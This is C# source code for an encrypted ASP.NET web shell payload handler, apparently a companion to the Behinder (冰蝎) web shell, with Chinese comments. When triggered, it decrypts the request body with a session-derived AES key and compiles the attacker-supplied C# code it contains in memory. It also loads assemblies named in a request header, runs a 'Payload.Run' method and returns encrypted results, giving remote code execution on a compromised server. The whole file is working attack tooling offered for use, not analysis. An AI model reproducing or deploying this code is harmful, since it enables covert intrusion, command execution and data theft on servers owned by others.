using System;
using System.Text;
using System.IO;
using Microsoft.CSharp;
using System.Web;
using System.Security.Cryptography;
using System.CodeDom.Compiler;
using System.Runtime.Serialization;
using System.Collections;
using System.Runtime.Serialization.Json;
using System.Reflection;
using System.Collections.Generic;

public class U // 当远程冰蝎shell为新的时改名为U
{
    [KnownType(typeof(ArrayList))]
    [DataContract]
    class Ret
    {
        [DataMember]
        public int code;

        [DataMember]
        public string data;

        [DataMember]
        public ArrayList msg;

        public void add_error_info(object errcode, string errmsg, bool iswarning){
            ArrayList table = new ArrayList();
            table.Add(errcode);
            table.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(errmsg)));
            table.Add(iswarning);
            msg.Add(table);
        }
    }

    Ret ret;
    HttpContext context = HttpContext.Current;
    string[] extra_assemblys;
    string split = "Z3lobmI=";

    public override bool Equals(object obj)
    {
        ret = new Ret();
        ret.code = 0;
        ret.data = "";
        ret.msg = new ArrayList();
        string code = GetCode();
        EvalCode(code);
        context.Response.Write(Convert.ToBase64String(crypt(Encoding.UTF8.GetBytes(json_encode(ret)))));
        return true;
    }

    string json_encode(object obj)
    {
        DataContractJsonSerializer js = new DataContractJsonSerializer(obj.GetType());
        MemoryStream msObj = new MemoryStream();
        js.WriteObject(msObj, obj);
        msObj.Position = 0;
        StreamReader sr = new StreamReader(msObj, Encoding.UTF8);
        string json = sr.ReadToEnd();
        sr.Close();
        msObj.Close();
        return json;
    }

    byte[] crypt(byte[] data, bool encrypt=true)
    {
        byte[] key = Encoding.UTF8.GetBytes(context.Session[0] + "");
        if(encrypt)
            return new RijndaelManaged().CreateEncryptor(key, key).TransformFinalBlock(data, 0, data.Length);
        return new RijndaelManaged().CreateDecryptor(key, key).TransformFinalBlock(data, 0, data.Length); 
    }

    string encode(string msg)
    {
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(msg));
    }

    void Get_extra_assemblys(){//获取额外需要引用的程序集
        if(context.Request.Headers["Token"] != null){
            string token = Encoding.UTF8.GetString(crypt(Convert.FromBase64String(context.Request.Headers["Token"]), false));
            var assems = AppDomain.CurrentDomain.GetAssemblies();
            string[] tmp1 = token.Split(';');
            List<string> tmp2 = new List<string>();
            foreach(string af in tmp1){
                if(!File.Exists(af)){
                    tmp2.Add(af);
                    continue;
                }
                Assembly.LoadFrom(af);
            }
            extra_assemblys = tmp2.ToArray();
        }
    }

    void EvalCode(string code){
        try{
            Get_extra_assemblys();
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compilerParams = new CompilerParameters();
            compilerParams.GenerateInMemory = true;
            compilerParams.GenerateExecutable = false;
            var assems = AppDomain.CurrentDomain.GetAssemblies();
            foreach(var assem in assems){
                compilerParams.ReferencedAssemblies.Add(assem.Location);
            }
            if(extra_assemblys != null && extra_assemblys.Length>0){
                foreach(string assem in extra_assemblys){
                    compilerParams.ReferencedAssemblies.Add(assem.Trim());
                }
            }
            CompilerResults cr = provider.CompileAssemblyFromSource(compilerParams, code);
            if(cr.Errors.Count > 0){
                ret.code = 0;
                foreach(CompilerError ce in cr.Errors){
                    ret.add_error_info(ce.ErrorNumber, ce.ToString(), ce.IsWarning);
                    if(!ce.IsWarning) ret.code = -1;
                }
                if(ret.code == -1)
                    return;
            }
            object o = cr.CompiledAssembly.CreateInstance("Payload");
            if(o == null){
                throw new Exception("Create Payload instance failed!");
            }
            MethodInfo mi = o.GetType().GetMethod("Run");
            if(mi == null){
                throw new Exception("Create Run method in class Payload failed!");
            }
            object result = mi.Invoke(o, null);
            ret.code = 1;
            ret.data = encode(result.ToString());
        }catch(System.Exception error){
            ret.code = -1;
            ret.add_error_info(error.GetType().FullName, error.Message+error.StackTrace, false);
        }
    }

    // 参考冰蝎 关于取尾部数据的代码，https://xz.aliyun.com/t/2758
    private string GetCode()
    {
        context.Request.InputStream.Seek(0, 0);
        byte[] key = Encoding.UTF8.GetBytes(context.Session[0] + "");
        byte[] fullData1 = context.Request.BinaryRead(context.Request.ContentLength);
        byte[] fullData = new RijndaelManaged().CreateDecryptor(key, key).TransformFinalBlock(fullData1, 0, fullData1.Length);
        int extraIndex = IndexOf(fullData, Convert.FromBase64String(split));// 分割代码 
        byte[] extraData = new List<byte>(fullData).GetRange(extraIndex + 5, fullData.Length - extraIndex - 5).ToArray();
        return Encoding.UTF8.GetString(extraData);
    }
    private int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        if (srcBytes == null) { return -1; }
        if (searchBytes == null) { return -1; }
        if (srcBytes.Length == 0) { return -1; }
        if (searchBytes.Length == 0) { return -1; }
        if (srcBytes.Length < searchBytes.Length) { return -1; }
        for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
        {
            if (srcBytes[i] == searchBytes[0])
            {
                if (searchBytes.Length == 1) { return i; }
                bool flag = true;
                for (int j = 1; j < searchBytes.Length; j++)
                {
                    if (srcBytes[i + j] != searchBytes[j])
                    {
                        flag = false;
                        break;
                    }
                }
                if (flag)
                {
                    return i;
                }
            }
        }
        return -1;
    }
}

